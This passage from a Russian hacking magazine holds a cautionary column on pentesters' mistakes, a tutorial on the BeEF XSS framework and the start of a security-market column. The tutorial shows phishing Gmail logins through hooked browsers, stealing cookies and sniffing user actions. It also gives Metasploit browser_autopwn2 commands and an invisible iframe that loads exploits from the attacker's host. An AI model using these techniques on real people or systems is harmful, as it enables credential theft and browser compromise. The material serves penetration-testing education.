тестером, схожая ситуация произошла со мной во время подготовки к рабо-
те с реальными заказчиками. Подключившись к своему рабочему компьютеру
через VPN, я без задней мысли запустил Cain и врубил ARP spoofing. Перед
тем, как соединение разорвалось, я успел лишь подумать, что утро — лучшее
время для сбора доменных учеток, ведь все приходят на работу и начинают
логиниться в домен. Это, пожалуй, была моя первая и последняя грубая ошиб-
ка в подходе к проведению пентеста.
   Сетевой дестрой продолжался на протяжении получаса, после чего я су-
мел найти своего человека в организации, который обезвредил рабочий ком-
пьютер, выдернув из него шнур питания. Естественно, администраторы нашли
по MAC-адресу мой компьютер, но тут их ждал сюрприз — он был выключен.
Никто не подумал, что MAC можно подменить (я тоже об этом тогда не поду-
мал, если честно), его включили и залогинились под учетной записью админи-
стратора домена (!), чтобы найти улики. И, конечно, нашли их.
   Тогда все вместе посмеялись и продолжили работать, но после этого мне
некоторое время было неловко общаться с админами. А ещё после этой исто-
рии я думал, что можно было бы установить себе на машину кейлоггер и полу-
чить учетную запись администратора домена — этакая ловля на живца. Одна-
ко все это осталось теорией, которую не пришлось проверять на практике.

НЕСТАБИЛЬНЫЕ ЭКСПЛОИТЫ
Для решения некоторых задач, будь то получение паролей из конфигураци-
онных файлов или проведение ARP спуфинга, пентестеру необходимы макси-
мальные привилегии в системе. В большинстве случаев они получаются через
эксплуатацию уязвимостей в ядре.
   Как известно, публичные эксплоиты — это скорее продвинутые proof-of-
concept с возможностью выплевывать рутовый шелл, нежели отлаженные
программы. Сужу по себе — все мои эксплоиты работают, но я не тестирую
и не отлаживаю их ради стабильности. Если на следующей системе эксплоит
не срабатывает, тогда-то я его и доработаю. Уверен, логика тебе понятна.
  В ночной погоне за рутом несложно забыть, что эксплоит не стабилен, и что
не следует его запускать без предварительного согласования с заказчиком.
Но адреналин и желание достичь цели любым путем делают своё дело. Ты на-
деешься, что всё будет окей, но если есть ощущение риска, то лучше не спе-
шить. Желание удивить заказчика своим мастерством — это хорошо, но ма-
лейшая вероятность нарушить доступность ресурса должна охладить тебя
и остановить от рискованной попытки.
   Конечно, эксплуатация эксплуатации рознь. Одно дело, когда сервис выдает
ошибку отказа в обслуживании после попытки запустить кернел эксплоит, за-
груженный с exploit-db. Другое — отказ в обслуживании из-за того, что пенте-
стер был стеснен во времени, не имел полного доступа к сети и вслепую запу-
стил только что написанный им непротестированный эксплоит. Второй вариант,
безусловно, выглядит куда более благородным, несмотря на схожий результат.
  Один мой знакомый как-то попал в такую ситуацию и уронил сервис из-за
некорректного шеллкода в своем эксплоите. Он не растерялся и предъявил
заказчику примерно следующее: «Вы знаете, что у вас сервер X недоступен?
Мы тут работаем и у нас время ограничено, срочно решите проблему!» Со-
циальная инженерия на практике! Через пару минут уязвимый сервис снова
стал доступен; за это время знакомый успел поправить шеллкод. В результате
он получил доступ к серверу со второго раза. Однако рассмотренная ситуа-
ция — скорее исключение из правил, ведь знакомый был уверен, что шеллкод
на этот раз отработает как надо.
ХАЛАТНОСТЬ, НАГЛОСТЬ, ОТСУТСТВИЕ ОСТОРОЖНОСТИ
Эта троица — главные друзья правосудия, которое пытается настигнуть не-
задачливого хакера, ступившего на темную сторону. Но чего бояться белым
шляпам? Оказывается, все того же.

Халатность
Представь, что ты развиваешь вектор атаки из большой сети DMZ во внутрен-
нюю сеть организации. Вдруг ты понимаешь, что ты наткнулся на вероятную
точку входа и ошибочно полагаешь, что она может быть не единственной. Эта
мысль небезосновательна — сканирование сети DMZ идет своим ходом, а ты
не хочешь терять время даром и начинаешь анализировать найденные серви-
сы и ресурсы. Отмечу особо — ни в коем случае не прибегай к подходу «Халк
крушить» и думай, что делаешь. То, что тебя не заметили на этапе проникнове-
ния в DMZ, еще не говорит, что за ИС никто не следит. Не стоит расслабляться
и забывать об осторожности.
  Именно с такой беспечностью я однажды и столкнулся. К серверу на пе-
риметре DMZ и внутренней сети был получен доступ на исполнение команд
через уязвимое веб-приложение, запущенное от рута. Хеши были сдамплены
и скормлены JTR. Результат не заставил долго ждать и команда пентестеров
успешно получила пароль к SSH. Далее же произошел настоящий факап —
кто-то инициировал подключение по SSH к серверу в DMZ с целью проверить
валидность логина и пароля. Зачем? Вероятно, ради красивого скриншота
в отчете. Не стану томить — доступ к DMZ был потерян менее чем через час.
   Оказалось, что сервер был единственным связующим звеном между вну-
тренней сетью организации и DMZ. Администраторы внимательно за ним сле-
дили: одному из них по факту логина по SSH приходили SMS с идентифика-
тором пользователя и IP адресом его хоста. Халатность привела к тому, что
действия команды обнаружили. Проект перестал быть секретом для адми-
нистраторов, действовать стало ещё сложнее. И, что оказалось для команды
печальнее всего, нам пришлось работать неделю на выезде в маленьком об-
ластном городке в холодных стенах огромной организации.

Наглость
В практике каждого пентестера бывают моменты, когда хочется наперекор
интуиции и здравому смыслу подключиться к VNC, Radmin или RDP компью-
тера администратора в его рабочее время. С одной стороны, это необходи-
мость — в большинстве случаев администраторы выключают свои рабочие
станции и уносят с собой ноутбуки. С другой стороны, это очень рискованный
и зачастую опрометчивый шаг.
   Если администратор не хранит пароли к сетевым устройствам на рабочем
столе, риск не будет оправдан. Многие админы не покидают рабочее место
на время обеда — для айтишника нормально провести перерыв за компьюте-
ром. В этой ситуации возникает вопрос: стоит ли дразнить администратора?
Пентестер прекрасно понимает, что пользователь на удаленном хосте активен
и малейшее воздействие на его интерактивный сеанс заметят. Наглеть или
нет — личное дело каждого. В худшем случае вторжение будет обнаружено.
  Я слышал огромное количество пентестерских историй о том, как кто-то
влез в сеанс админа. Не буду скрывать, я сам проделывал такое пару-тройку
раз. Но обычно это приносит уйму эмоций и совсем немного профита.
  Чаще всего события разворачиваются так: ты подключаешься к компьюте-
ру админа через Radmin и видишь, как тот набирает документ. После подклю-
чения в районе трея появляется всплывающее окно, которое уведомляет его
о новом сеансе. Ты понимаешь, что это привлекло внимание человека за рабо-
чей станцией. Он перестает набирать текст, курсор в документе мигает на бе-
лом фоне. Ты осознаешь, что администратор уже понимает: что-то происхо-
дит, кто-то вломился в его уютный домик. Ты пытаешься представить себе его
лицо, его чувства.
   Эти три секунды кажутся бесконечностью. Выброс адреналина на обоих
концах соединения. Последнее, что ты видишь — указатель мыши на удален-
ном рабочем столе скользит в правый нижний угол экрана, кликает на иконку
Radmin и терминирует все сессии.
   Всплеск эмоций, лулзы, и абсолютно никакого профита. Прежде чем пойти
на это, адекватно расставь для себя приоритеты в рамках проекта и просчитай
все возможные риски. Если без нахрапа не прорваться, то будь готов к тому,
что твое присутствие в ИС будет обнаружено.

БЛОКИРОВКА УЧЕТНЫХ ЗАПИСЕЙ
Брутфорс — неотъемлемая часть любого тестирования на проникновение. По-
жалуй, следующую ошибку, о которой я расскажу, можно свалить на халатность.
А дело вот в чем. Брутфорс часто используется для получения доступа к домену
AD, и я встречал несколько случаев, когда пентестер в радостной спешке ори-
ентировался на вывод команды net accounts /domain, исполненной не в той
консоли. В результате он принимал свою локальную парольную политику за па-
рольную политику домена, радовался тому, что значение счетчика блокировок
учетных записей равно нулю, и начинал брутфорс доменных учеток по словарю.
Надеюсь, ты понимаешь, к чему это приводит? В лучшем случае — пара забло-
ченных на пятнадцать минут учеток, в худшем — более 10% учетных записей
заблокировано, вторжение обнаружено, доступность ИС грубо нарушена.

ПЛОХАЯ ПОДГОТОВКА ИНСТРУМЕНТАРИЯ
От правильного инструментария зависит очень многое. Рабочий лэптоп пен-
тестера должен, на мой взгляд, ломиться от всевозможных дистрибутивов
и утилит всех мастей. Без правильных средств пентестер не сможет сделать
абсолютно ничего. На практике же из-за банальной лени или отсутствия опы-
та многие пентестеры в первый день работ по внутреннему тестированию
на проникновение не могут сделать ничего лучше, чем сканировать сеть, ис-
пользуя недавно установленный nmap. Выглядит это плачевно, драгоценное
время уходит впустую.
  Я совершал сходную ошибку как минимум однажды, когда был новичком.
Чего я не ожидал увидеть, придя к заказчику, — так это череду баз данных
Oracle. Конечно, ни транспорта, ни клиента для них у меня не было. День в ито-
ге был потрачен на сканирование nmap, поиск уязвимостей в веб-приложени-
ях и выявление стандартных учетных записей на устройствах.
  Не повторяй подобных ошибок, будь готов ко всему. Как минимум имей
в арсенале транспорты для всевозможных сервисов.

ДРЕСС-КОД
Большинство пентестеров, вероятно, понимают, о чем пойдет речь. Как бы
это глупо ни звучало, но иногда внешний вид бывает очень важен. Например,
чтобы попасть на территорию какой-нибудь трансгалактической организации,
занимающейся добычей минеральных ресурсов на Марсе, придется внешне
соответствовать некоторым стандартам, очень нелегким для начинающего
пентестера. Если не хочешь тратить время впустую, одевайся правильно. Ин-
тересуйся дресс-кодом заранее, и избежишь ряда проблем.
  В моей практике была забавная история, когда мне и моим коллегам (к сло-
ву, тоже крутым пентестерам) довелось около часа дожидаться открытия ма-
газина «Одежда для мужчин» в одной из провинций нашей необъятной роди-
ны. Не горю желанием об этом рассказывать, но там не оказалось зауженных
брюк для худых молодых людей. К счастью для моих коллег, худым был только
я, и смотрелся я в широких брюках, подшитых в соседнем ателье, очень ко-
мично. В итоге у меня есть замечательный «лук», но мы потеряли около трех
часов рабочего времени. В условиях командировки и в первый день работ это
очень много. Не переживай — неурядицы не помешали нам отлично справить-
ся с задачей.

ОТСУТСТВИЕ ЗНАНИЙ ОБ ИСПОЛЬЗУЕМОМ ИНСТРУМЕНТАРИИ
Незнание или непонимание того, как конкретно работает та или иная утилита
из твоего арсенала, может в один прекрасный момент сыграть с тобой очень
злую шутку. Уверен ли ты, что сканер для автоматизированного поиска уязви-
мостей в веб-приложениях случайно не дропнет БД сайта, если найдет на нем
SQL-инъекцию? Я на твоем месте ничего бы не утверждал, не погоняв сканер
на тестовом стенде. Это поможет понять заложенную в него логику, и, если
исходный код закрыт, это единственный способ проверки.
  Я сталкивался с ситуацией, когда из-за использования sqlmap в режиме
hack it, I don’t care дропнули БД на копии продакшена, что привело к по-
тере ценных человекочасов. Тебе может повезти меньше, чем тому незадачли-
вому пентестеру. Вообще, ты должен быть готов отвечать за каждый процесс,
который запускаешь в отношении ИС заказчика.

ОТСУТСТВИЕ ДАННЫХ ДЛЯ ОТЧЕТА
Party time для пентестера подходит к концу сразу после того, как достигнута ко-
нечная цель, поставленная заказчиком. AD под контролем, сетевое оборудо-
вание под колпаком — отлично. Наступает этап подготовки отчета. Но в боль-
шинстве случаев начинающие пентестеры, дорвавшись до «мяса», не любят
писать отчеты. Это можно понять. Сложнее понять другое. Начинаешь под-
готовку отчета, а скриншотов нет, логов нет, таймлайна атаки — нет. Мораль:
никогда не ленись документировать все свои сколько-нибудь значимые дей-
ствия, связанные с пентестом. Иначе можешь попасть в неприятную ситуацию,
когда ты выполнил работу на «отлично», заказчик воодушевлен результатом
и ждет подробнейший отчет. И что он увидит? Короче, не расстраивай заказ-
чика, документируй!
  Я знаком с этой ошибкой исключительно по опыту работы в команде. Ино-
гда попадаешь в ситуацию, когда кто-то из твоей команды не делал скриншо-
ты на протяжении всего проекта, или же скриншоты внезапно куда-то пропали.
Причина отсутствия не так важна, но факт остается фактом — ошибка встре-
чается. Если ты работаешь в команде, не забывай напоминать коллегам, что
нужно документировать процесс, и подавай им хороший пример.

OUTRO
Не надо начинать после всего прочитанного бояться совершать ошибки. Все
учатся на ошибках: кто-то на своих, кто-то на чужих. Эта колонка написана
для того, чтобы можно было поучиться на чужих. Кстати, практически то же
самое ты делаешь, когда выявляешь слабые места ИС и помогаешь их
закрыть. Stay tuned!
ПОЛЕЗНАЯ ИНФОРМАЦИЯ


Ссылки по теме
• The First Few Months of Penetration Testing: What They Don't Teach You in School
• The Common Mistakes Every Newbie Pentester Makes

Общая теория по пентестам
•  Vulnerability Assessment
• Open Source Security Testing Methodology Manual
• The Penetration Testing Execution Standard

Немного практики
•  PentesterLab
•  Penetration Testing Practice Lab

В закладки
• Open Penetration Testing Bookmarks Collection

Right way to contribute
• DC7499
• DC7812
• 2600 russian group
ВЗЛОМ
ЗОМБИ-
СКРИПТИНГ
ИСПОЛЬЗУЕМ
BEEF ДЛЯ
ПРОДВИНУТЫХ
XSS-АТАК





  Михаил Фирстов,
    HeadLight Security
     @cyberpunkych
  cyber-punk@xakep.ru
XSS-атаки (сross-site scripting) уже давно вышли за рамки
угона сессии через document.cookie на сниффер злоу-
мышленника. Думаю, многие хорошо помнят даже раз-
личные онлайн-сервисы, которые позволяли с легкостью
вставлять нужный пейлоад и ждать, пока на e-mail придет
уведомление с данными жертвы. Сейчас на дворе 2016
год, так что предлагаю оставить все вышеописанное где-
то в 2007 и вернуться в реальность. Сегодня речь в статье
пойдет о популярном инструменте, который помогает вы-
жать максимум из простого внедрения JS-кода. Итак, зна-
комься — BeEF.


BeEF — это фреймворк, позволяющий централизованно управлять пулом за-
раженных через XSS клиентов, отдавать команды и получать результат. Он ра-
ботает следующим образом:
•  злоумышленник внедряет на уязвимый сайт скрипт hook.js;
•  hook.js сигналит C&C (BeEF) о том, что новый клиент онлайн;
•  злоумышленник входит в панель управления BeEF и удаленно «рулит» зара-
  женными браузерами: исполняет пейлоад и получает ответ.

Жертве достаточно выполнить в своем браузере hook.js, и она станет очеред-
ным «зомби», которому можно будет посылать различные команды, подсо-
вывать вредоносные экзешники и так далее. А от злоумышленника требуется
просто запустить beef-xss и открыть в браузере панель управления, в которой,
собственно, все самое интересное и происходит.
  BeEF «из коробки» содержит уйму встроенных техник, эксплойтов, плагинов
и значительно облегчает одновременную работу со множеством клиентов. Ко-
нечно же, зараженный пользователь может покинуть страницу с внедренным
скриптом, но специально для этих целей существует атака Man-in-The-Browser,
которая позволяет следить за всеми действиями клиента в контексте одного
домена, пока он остается на сайте или собственноручно не поменяет адрес
в строке URL.

УСТАНОВКА BEEF
Начать надо, конечно, с установки. Я рассматриваю ситуацию, в которой у нас
есть своя впс/вдс где-то в облаках с белым айпишником и четырнадцатой Бу-
бунтой:
root@myownvpn:~# uname -a
Linux myownvpn 3.13.0-52-generic #85-Ubuntu SMP Wed Apr 29 16:44:17
UTC 2015 x86_64 x86_64 x86_64 GNU/Linux

Действуем по официальной инструкции, которую можно найти в репозитории
на гитхабе. BeEF написан на Ruby, поэтому установка стандартная для боль-
шинства небольших руби-приложений: rvm, ruby, bundler и bundle  install.
В общем, проблем возникнуть не должно.
   Кстати, BeEF также включается в дефолтную поставку Kali Linux 2, поэтому
если ты используешь творение Offsec’а, то BeEF у тебя уже установлен.

ИСПОЛЬЗОВАНИЕ
После запуска beef-xss открываем в нашем браузере ссылку http://127.0.0.
1:3000/ui/authentication и логинимся как beef:beef. Отлично, у нас есть все,
что нужно. Чтобы протестировать работу BeEF’a, предлагаю «захукать» свой
же браузер, перейдя на страницу /demos/basic.html. Как видно в исходном
коде, у нас подгружается тот самый hook.js, и теперь в разделе Online Browsers
появился хост и список «захуканных» клиентов. Это и есть наши зараженные
зомби.
   Если выбрать нужного клиента и перейти на вкладку Commands, нашему
взору предстанет широкий спектр различных техник, сплойтов, атак и трюков,
которые можно использовать буквально за пару кликов.

СОЦИАЛЬНАЯ ИНЖЕНЕРИЯ
Для начала выберем что-нибудь простое и понятное — открываем раздел Social
Engineering и попробуем провернуть фишинг логина в гугл-аккаунт. Для этого
нам достаточно указать страницу, на которую будет перенаправлен пользова-
тель, и задержку (delay) до редиректа. Заполняем (или, в нашем случае, остав-
ляем как есть), нажимаем кнопку Execute — волшебным образом содержимое
страницы меняется на знакомый и привычный глазу интерфейс авторизации
в гугл-почте!
   Притворимся, что мы жертва, и введем какие-нибудь данные. После нажа-
тия кнопки Sign in нас перенаправляет на настоящую авторизацию Гугла и за-
одно перекидывает на указанную ранее в настройках страницу. Как можно
увидеть, нажав в BeEF’е на отправленную команду, мы успешно перехватили
введенные пользователем данные.
Фишинговая страница логина в GMail, показанная жертве с помощью BeEF





Перехваченные через BeEF данные от Гмейла
САМЫЕ ОСНОВНЫЕ КОМАНДЫ
Где же старый добрый document.cookie, который всем так нужен? Да тут же,
под рукой — в разделе Hooked Domain найдется достаточно команд для почти
мгновенного доступа к различной информации из браузера жертвы, в том чис-
ле и вожделенным «печенькам».
  Этим несложным образом можно получить список подключенных на стра-
нице скриптов и ссылок или весь исходный код страницы. Отдельное внимание
я советую уделить такой фиче, как замена ссылок — изменить всё так, чтобы
каждая ссылка на странице вела на нужный нам адрес. Среди всех доступных
команд есть даже перенаправление пользователя на ролик с песней «Never
gonna give you up» — классика как-никак!





You've been rickroll'd!

ФИНГЕРПРИНТ
Помимо всего вышеописанного есть раздел Browser, в котором собрано мно-
жество полезных фич для максимального фингерпринта браузера жертвы. Мож-
но узнать список установленных расширений в браузере, наличие LastPass,
FireBug и т.д. С помощью команды «Webcam» можно попробовать подсунуть
пользователю Flash-плагин для работы с вебкой, жаль только, что данная тех-
ника уже устарела, как и Flash в целом. Не буду перечислять и описывать все
фичи, а посоветую тебе изучить их самостоятельно, заодно проверив актуаль-
ность в современных браузерах.
ЭКСПЛОЙТЫ
Следующий интересный нам раздел — Exploits, как ни странно. В нем найдет-
ся множество готовых векторов для эксплуатирования различных уязвимо-
стей. Прежде всего я советую обратить внимание на сплойты для различных
роутеров. Мы уже не раз писали, какие фатальные баги иногда содержат роу-
теры: часто от безобидных XSS’ок получается раскрутить их до полноценного
RCE через CSRF. К слову, тот же сценарий повторяется и с многими другими
устройствами, которые находятся в сети потенциальной жертвы, будь то NAS,
камеры, локальные сервисы и так далее. Список эксплойтов, конечно, не мо-
жет похвастаться зиродеями или огромным выбором, но ведь никто не запре-
щает писать кастомные плагины для бифа под свои уязвимости ;)

АТАКА НА БРАУЗЕР, СНИФФИНГ ОТПРАВЛЯЕМЫХ ДАННЫХ
Одной из самых интересных атак при использовании XSS можно назвать Man-
in-The-Browser. Она позволяет отслеживать различные действия инфициро-
ванного пользователя на всем ресурсе, а не только на странице с пейлоа-
дом. Эффект достигается за счет фоновой подгрузки запрошенной страницы
по клику и подмены DOM, без изменения реального location’a браузера (при-
мерно как в рельсовом turbolinks). Естественно, эта фишка сработает только
при соблюдении SOP: запрошенная страничка должна иметь тот же протокол,
порт и домен, а иначе загрузки просто не произойдет.





BeEF отлавливает попытки перехода по другую страницу
и подгружает данные динамически
   Это крайне удобная фича, избавиться от которой можно только путем пря-
мого изменения URL адреса в строке браузера. Как можно увидеть, в логах
отображаются все действия, выполненные пользователем, такие как ввод
и отправка POST/GET запросов, открытие других сайтов в новом окне и т.д.

РАБОТА С СЕТЬЮ
Многие функции из секции Network могут не работать, например, детект со-
циальных сетей у меня упорно отказывался работать. Подозреваю, что там ис-
пользовалась баги/фичи, которые были прикрыты сервисами. Но не надо рас-
страиваться: всегда стоит помнить, что в некоторых ситуациях даже одна XSS
в браузере жертвы может привести к компрометации всей домашней сети.
Поэтому обрати внимание на различные сетевые сканнеры, представлен-
ные в BeEF’е. Как показывает практика, далеко не все из них будут работать
в современных браузерах, но команда GET HTTP servers у меня отработала
и честно нашла в локальной сети старенький Zyxel с веб-интерфейсом. Ко-
нечно, детект серверов очень простой и основывается на попытке подгрузить
favicon с каждого из указанных в диапазоне апишников.
  Еще советую посмотреть на такую замечательную функцию, как сканирова-
ние сети с использованием словаря DNS-имен. Кто знает, вдруг вы для удоб-
ства назвали свой роутер «router»? :)

MSF
Детект и фингерпринт внутренней сети это, конечно, замечательно, как и по-
пытки использовать различные сплойты под роутеры со всякими CSRF/XSS/
etc. Но что, если мы хотим стать крутыми хакерами и попробовать сразу про-
бить браузер жертвы? Нет ничего проще, ведь BeEF поддерживает использо-
вание Metasploit’а. Это, конечно, не приватные связки с 0day, но никто и не га-
рантирует, что у пользователя будет последняя версия браузера/плагинов :)
   Чтобы подружить metasploit и beef, достаточно выполнить несколько про-
стых действий:
1. Открыть главный config.yaml (у меня в Kali он был расположен по адресу /
   usr/share/beef-xss/), найти раздел Extension и у Метасплойта изменить
   значение параметра enable на true.
2. Открыть файл настроек плагина метасплойта (например, /usr/share/
   beef-xss/extensions/metasploit/config.yaml) и изменить параметры host,
   callback_host (остальное на твое усмотрение).
3. Запустить метасплойт и выполнить команду:

msf > load msgrpc ServerHost=192.168.186.149 User=msf Pass=abc123

Перезапуск BeEF’а — и нашему взору открываются несколько сотен модулей
метасплойта, которые можно применять по своему усмотрению. Давай рас-
смотрим простой пример использования связки BeEF + Metasploit. Возьмем
модуль browser_autopwn2, настроим и запустим его.

msf > use auxiliary/server/browser_autopwn2
msf auxiliary(browser_autopwn2) > show options
            …тут указываем опции, например SRVHOST…
msf auxiliary(browser_autopwn2) > run

Для удобства использования и настройки в качестве URIPATH я указал /
autopwn. Теперь идем в BeEF, выбираем раздел Misc и используем команду
на добавление невидимого фрейма. В качестве адреса просто указываем
что-то в духе http://наш_ip:8080/autopwn. После отправки команды видно, что
в браузере жертвы фрейм с связкой подгрузился, а все остальное уже на со-
вести метасплойта. Точно таким же образом можно использовать и другие мо-
дули Metasploit’а и SET’а (отличный инструмент широкого спектра возможно-
стей для атак, связанных с соц. инженерией).

Атаки на расширения браузера

Еще один интересный и часто использующийся вектор атаки — атака на рас-
ширения пользователя. В случае успеха она гарантирует нам гораздо большие
возможности, нежели простое внедрение скрипта на страничку сайта, ведь
у расширений куда больше прав. Специально для этих целей был создан ана-
лог BeEF`а, который в итоге перерос в самостоятельный полноценный фрей-
мворк — Chrome Extension Exploitation Framework, или просто ChEF. Среди его
возможностей выделяются такие фичи, как:
•  мониторинг открытых вкладок в браузере;
•  глобальное выполнение JS кода на любой из вкладок (global XSS);
•  чтение http-only кукисов;
•  получение и изменение истории браузера;
•  снятие скриншотов окон браузера;
•  доступ к файловой системе через file://;
•  внедрение BeEF.

Этот инструмент стоило упомянуть, но он заслуживает отдельного материала,
поэтому в данной статье не будем расписывать все, на что ChEF способен.
ВЫВОДЫ
Конечно, можно было бы описать еще часть функциональности BeEF’a, рас-
сказать про phonegap, инфицирование мобильных приложений, применение
при MiTM’е и т.д., но все это, к сожалению, не умещается в формат одной ста-
тьи. Кратко говоря, BeEF — это действительно самый удобный и самый крутой
(во всех смыслах) фреймворк для работы с XSS, который выжимает из просто-
го внедрения JS-кода абсолютный максимум, оставляя место для творчества
(BeEF — проект опенсорсный), и к тому же поддерживает кастомные плаги-
ны. Такой инструмент прекрасно подходит как и для проведения пентестов,
так и для решения различных CTF-тасков и всего, на что еще способна твоя
фантазия.
ВЗЛОМ: Колонка Александра Полякова





Всем привет!
 Давненько я не писал
 ничего в журнал
 «Хакер», так что
 многие, наверное, не
 в курсе, что за чувак
 такой собрался тут
 вести колонку. Так что
 пара слов обо мне.
Меня зовут Александр
 Поляков, но это не так
 важно — я в основном
 известен как sh2kerr.
РЫНОК
БЕЗОПАСНОСТИ
INTRO
Последнее время, а точнее, уже лет пять, как я занимаюсь разработкой про-
дуктов в области ИБ и выводом их на международный рынок. Я работаю тех-
ническим директором в компании ERPScan (дочернее подразделение Digital
Security). В последнее время в сферу моих личных и профессиональных инте-
ресов входит анализ событий на международном рынке ИБ.
   Когда-то давно, примерно в 2002 году, я, как и ты сейчас, читал журнал «Ха-
кер» (тогда еще в бумажном виде) и учился взламывать системы. Потом я стал
этим заниматься уже профессионально. Это было идеально: делаешь люби-
мое дело, взламываешь системы всяких банков и нефтяных компаний (то есть,
конечно, проводишь «тест на проникновение») и еще деньги за это получаешь.
А между делом ищешь дырки в софте всяких вендоров и обходишь самые раз-
нообразные защиты. Пишешь потом, что тут они облажались, и там они обла-
жались, и вообще никто вокруг не может ничего безопасного сделать. И толь-
ко ты один Робин Гуд — всех разоблачил и жить научил.
  Но тут настигает тебя печаль глубокая, потому что, к сожалению, так по-
лучается, что все самые умные исследователи только взламывают системы,
а строить защиту остается некому, вот и ломают нас все, кому не лень. И ре-
шил я, что не буду больше ломать, а буду строить. Ломать, конечно, классно,
но на определенном этапе приходит желание сделать что-то свое, а не копать-
ся в чужом кривом коде. Вот так, в общем-то, мы и начали в далеком 2010 году
и ничуточки не жалеем. Особенно сейчас, но речь не об этом.

ЗАЧЕМ Я ТУТ
Индустрия информационной безопасности стремительно развивается и сей-
час ее можно действительно назвать индустрией и говорить о каком-то рынке.
Раньше у человека, который разбирается в технической стороне безопасно-
сти, были два пути: либо в криминал, либо в пентестеры, да и то со вторым
было туговато. Теперь же я могу смело утверждать, что есть и третий путь, и он
не менее интересен и перспективен — в разработчики средств защиты.
   Вакансий здесь выше крыши — начиная от разработчика как такового (ко-
торый в сто раз ценнее, если понимает контекст) и заканчивая аналитиками,
исследователями, менеджерами по продуктам и тех. пресейлами. А с учетом
всего происходящего в политике этот путь особенно актуален, если получится
продавать свои решения за границу. Не стоит, конечно, слишком обольщать-
ся. Препятствий на этом тоже масса — дорога-то непротоптанная. Но и уны-
вать не стоит — если получится, то хороший заработок обеспечен.
  В общем, я планирую вести колонку о рынке информационной безопас-
ности, о том, что происходит в мире стартапов в инфобезе. Уверен, что под-
растающее поколение вскоре захочет применить свои умения не только во
взломе и пентестах, но и в разработке продуктов, связанных с ИБ. Эта колон-
ка должна помочь тебе получить больше информации о том, что происходит
в этой области.
  Помимо обзора рынка и продуктов я буду иногда делиться историями из сво-
ей практики продвижения компании на международные рынки, рассказывать
об особенностях рынка ИБ в разных странах, а также отчитываться о поездках
на конференции и других приключениях.

КОМУ АДРЕСОВАНО
Пентестерам и аудиторам. Им в ходе работ все чаще встречаются систе-
мы безопасности, которые затрудняют проведение атак. Антивирусы, да и си-
стемы обнаружения вторжений уже далеко не редкость и с ними приходится
бороться. Но это лишь начало. Если раньше было три-четыре вида продуктов
и по три-четыре продукта каждого вида, то сейчас на рынке сотни решений,
которые тем или иным способом обеспечивают защиту. Скоро эти продукты
станут еще популярнее, а вам придется придумывать все более изощренные
техники обхода и скрытия атак от обнаружения. В общем, обзор новинок за-
щиты всегда полезен атакующему — нужно знать, как их обойти.

Инженерам по информационной безопасности. Им мне вряд ли удаст-
ся рассказать что-то новое, но многим будет полезно узнать, как привычный
набор средств безопасника из «аптечки первой помощи» всего лишь за пару
лет удивительным образом превратился в переносную клинику с изолятором,
психбольницей и моргом в придачу.
  Раньше люди думали так: «поставим антивирус и фаервол, и хватит. Что там
еще? Обнаружение вторжений? Ну давай! О SIEM я слыхал — говорят, годная
вещь, давай, что ли, и его поставим». А сейчас черт ногу сломит. Ладно, вся-
кие анти-APT и Security Intelligence, с которыми все постепенно проясняется,
но теперь тут тебе и RASP, CASB, UEBA, RTSI, ITRM и еще черт-те какие сокра-
щения. И все это не просто слова, а новые классы решений — наравне с анти-
вирусами и фаерволами. Запутаться стало проще пареной репы, причем, если
копнуть глубже, то половина — туфта полнейшая. Вот, собственно, о том, что
туфта, а что нет, я и расскажу.

Будущим разработчикам. Не теряю надежды, что Россия сможет стать

экспортером не только природных ресурсов, но и уникальных программных
продуктов, связанных с безопасностью — не одним же «Касперским» нам гор-
диться. Ну а на пути к этому светлому будущему надо понять, что же происхо-
дит на рынке безопасности, кто на нем играет и выигрывает, а кто выбывает.
Ведь область-то безумно интересная, но и крайне сложная — хотя бы потому,
что требует невероятного терпения.
СИТУАЦИЯ НА РЫНКЕ ИБ: КРАТКИЙ ОБЗОР
Итак, поехали. В последние два-три года в Америке появилась куча новых
компаний, связанных с информационной безопасностью. Причиной послу-
жило большое количество инцидентов, в том числе взломов крупных ком-
паний. Растет и страх перед кибератаками со стороны китайцев и русских.
Народ засуетился, аналитики начали пророчить мрачное будущее, где от ха-
керов ничего не утаить, и бюджеты, которые компании выделяют на безопас-
ность, пошли вверх.
   Тут же нашлись и разработчики программного обеспечения, желающие
получить долю в развивающемся рынке. Рост заметили венчурные инвесто-
ры, для которых рынок Cyber Security (так, между прочим, называется то, чем
мы с вами занимаемся) стал перспективным направлением наравне с Mobile,
Digital Marketing, здравоохранением и BigData. Сейчас весь рынок оценивается
в 75 миллиардов долларов и растет со скоростью 10% в год, что, в общем-то,
довольно существенно.
   Инвесторы вкладывают деньги, компании растут, пугают атаками потенци-
альных клиентов, приходят новые инвесторы и вкладывают еще больше де-
нег — круг замыкается. По дороге появляются и компании, которые далеки
от темы и просто хотят срубить денег по-быстрому — они выводят на рынок ма-
гические средства, якобы спасающие от всех проблем. Короче, куда без шар-
латанов, когда речь заходит о больших деньгах.
   Кто-то может сказать, что это пузырь и скоро он лопнет. Отчасти он будет
прав, и первые звоночки уже прозвучали. Но важно то, что из всего этого безу-
мия и высочайшей конкуренции вырастут самые инновационные и стойкие фир-
мы. А прочие уйдут со сцены или будут поглощены более крупной рыбой. В про-
шлом году в Америке инвесторы вложились в 229 стартапов, связанных с ИБ.
Каждому из них «на пожрать» дали от десяти миллионов долларов. Ясно, что
не все стартапы превратятся в стоящие компании, но, тем не менее, там есть
на что посмотреть. Мы же сегодня посмотрим на одну выдающуюся историю.

TANIUM
Сегодня на операционном столе у нас компания Tanium. Хоть я и кручусь в нуж-
ной области и посещаю практически все ивенты, я о ней до недавнего времени
почти не слышал. Но сейчас она привлекает все больше внимания — в первую
очередь тем, что имеет самые высокие оценки стоимости среди всех част-
ных компаний в области безопасности. Tanium оценивается в 3,5 миллиарда
долларов. Непросто найти что-нибудь для сравнения, но, например, пять лет
назад HP купила фирму ArcSigh за 1,5 миллиарда, а довольно известная ком-
пания Trustwave год назад была куплена всего за 800 миллионов.
  В общем, оценки стоимости Tanium смотрятся просто фантастически, учи-
тывая, что пару лет назад об этой фирме мало кто знал. Компания вроде бы су-
ществует с 2007 года, но до 2012 года работала в закрытом режиме и до поры
до времени не высовывалась. Управляют ей отец и сын — Девил Хиндави и Ори-
он Хиндави. При этом Орион буквально недавно был назначен генеральным
директором, в то время как его батя стал председателем совета директоров.
   Секрет успеха — отчасти в том, что за плечами у Хиндави стоят самые кру-
тые инвесторы в Долине, фонд Andreessen Horowitz. Марк Андриссен и Бен Хо-
ровиц владеют акциями всех топовых ИТ-компаний, начиная с Facebook, Twiter,
